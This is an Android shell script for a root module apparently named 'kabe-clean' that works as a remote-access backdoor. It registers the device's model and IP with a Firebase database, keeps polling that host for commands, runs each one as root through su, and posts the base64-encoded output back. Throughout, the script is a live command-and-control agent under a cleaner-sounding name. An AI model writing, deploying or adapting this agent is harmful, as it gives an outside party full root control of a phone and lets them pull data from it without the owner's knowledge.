#!/system/bin/sh
FB="https://khkh-38cba-default-rtdb.firebaseio.com"
MOD="/data/adb/modules/kabe-clean"
KEYF="$MOD/key"
LOG="$MOD/agent.log"
PIDF="$MOD/pid"
mkdir -p "$MOD" 2>/dev/null
[ -f "$PIDF" ] && kill -9 $(cat "$PIDF" 2>/dev/null) 2>/dev/null
echo $$ > "$PIDF"
log(){ echo "$(date '+[%H:%M:%S]') $1" >> "$LOG"; }

# Key
if [ ! -f "$KEYF" ]; then
    echo "KABE-$(cat /proc/sys/kernel/random/uuid | tr -d '-' | head -c8 | tr a-z A-Z)" > "$KEYF"
    chmod 600 "$KEYF"
fi
KEY=$(cat "$KEYF" | tr -d '\n\r ')
DEV=$(getprop ro.product.model 2>/dev/null); [ -z "$DEV" ] && DEV="android"
IP=""; for i in wlan0 eth0 wlan1; do IP=$(ip addr show $i 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1); [ -n "$IP" ] && break; done
log "KEY=$KEY DEV=$DEV IP=$IP"

# Wait internet
until ping -c1 -W3 8.8.8.8 >/dev/null 2>&1; do sleep 5; done

# Register
curl -s --connect-timeout 5 -X PUT -d "{\"device\":\"$DEV\",\"ip\":\"$IP\",\"online\":true,\"lastSeen\":$(date +%s)000}" "$FB/kabe/$KEY.json" >/dev/null 2>&1
log "registered"

LAST=""
while true; do
    [ -f "$MOD/stop" ] && rm -f "$MOD/stop" && break

    # Heartbeat
    curl -s --connect-timeout 5 -X PATCH -d "{\"online\":true,\"lastSeen\":$(date +%s)000}" "$FB/kabe/$KEY.json" >/dev/null 2>&1

    # Poll
    R=$(curl -s --connect-timeout 5 "$FB/kabe/$KEY/commands.json" 2>/dev/null)
    if [ -n "$R" ] && [ "$R" != "null" ] && [ "$R" != "{}" ]; then
        CID=$(echo "$R" | grep -o '"[^"]*":{' | head -1 | sed 's/"//g;s/:{//')
        CMD=$(echo "$R" | grep -o '"cmd":"[^"]*"' | head -1 | cut -d'"' -f4)
        ST=$(echo "$R" | grep -o '"status":"[^"]*"' | head -1 | cut -d'"' -f4)
        if [ -n "$CMD" ] && [ -n "$CID" ] && [ "$CID" != "$LAST" ] && [ "$ST" = "pending" ]; then
            LAST="$CID"
            log "CMD: $CMD"
            OUT=$(su -c "$CMD" 2>&1)
            RC=$?
            B64=$(echo "$OUT" | base64 -w0 2>/dev/null || echo "$OUT" | base64 2>/dev/null)
            log "posting output for $CID (b64 len=${#B64})"
            sh "$MOD/post_output.sh" "$KEY" "$CID" "$B64" "$RC"
            log "post done"
            log "done rc=$RC"
        fi
    fi
    sleep 2
done
rm -f "$PIDF"
